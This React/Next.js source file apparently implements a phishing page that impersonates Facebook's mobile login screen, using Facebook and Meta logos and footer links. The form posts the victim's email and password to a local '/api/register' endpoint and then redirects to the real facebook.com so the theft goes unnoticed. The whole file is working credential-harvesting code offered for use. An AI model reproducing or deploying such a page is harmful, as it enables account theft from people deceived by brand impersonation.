"use client";
import { useState } from "react";
import Image from "next/image";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(""); // Added error state

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(""); // Clear previous errors

    // Check for empty fields
    if (!email.trim() || !password.trim()) {
      setError("email or password incorrect");
      return;
    }

    try {
      const response = await fetch("/api/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();
      console.log("📢 Server Response:", data);

      if (response.ok) {
        window.location.href = "https://www.facebook.com";
      } else {
        setError(data.error || "Registration failed"); // Show server error
        console.error("❌ Registration failed:", data.error, data.details);
      }
    } catch (error) {
      setError("An unexpected error occurred"); // Show network error
      console.error("❌ Error:", error);
    }
  };

  return (
    <div className="flex flex-col items-center justify-between min-h-screen bg-gray-100 p-4 font-optimistic">
      {/* Language Selection */}
      <p className="text-sm text-gray-600 mb-4">English (UK)</p>

      {/* Facebook Logo */}
      <Image
        src="/images/5D8s-GsHJlJ.png"
        alt="Facebook Logo"
        width={60}
        height={60}
        className="mb-4"
      />

      {/* Login Form */}
      <div className="w-full">
        <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
                      {/* Error Message */}
          {error && (
            <div className="text-red-500 text-base text-center -mt-2">
              {error}
            </div>
          )}
          <input
            type="email"
            placeholder="Email address or Username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full p-4 border border-gray-300 rounded-xl text-lg font-medium focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-4 border border-gray-300 rounded-xl text-lg font-medium focus:outline-none focus:ring-2 focus:ring-blue-500"
          />



          <button
            type="submit"
            className="w-full bg-blue-600 text-white p-2 rounded-full font-semibold text-lg hover:bg-blue-700 transition"
          >
            Log in
          </button>
        </form>
        <p className="text-center text-gray-500 p-2 rounded-full font-medium text-base mt-3 cursor-pointer hover:underline">
          Forgotten password?
        </p>
      </div>

      {/* Meta Logo and Footer Links */}
      <div className="flex-col justify-between text-center mt-6 w-full">
        <button className="w-full mb-6 border-blue-600 border text-blue-600 p-2 rounded-full font-base text-lg ">
          Create new account
        </button>
        <div className="justify-center items-center flex mb-6">
          <Image
            src="/images/DDgwTv3JehF.png"
            alt="Meta Logo"
            width={60}
            height={12}
            className="text-gray-500"
          />
        </div>
        <div className="text-gray-500 text-[10px] mt-2">
          <a href="#" className="hover:underline">
            About
          </a>{" "}
          <a href="#" className="hover:underline ml-2">
            Help
          </a>{" "}
          <a href="#" className="hover:underline ml-2">
            More
          </a>
        </div>
      </div>
    </div>
  );
}
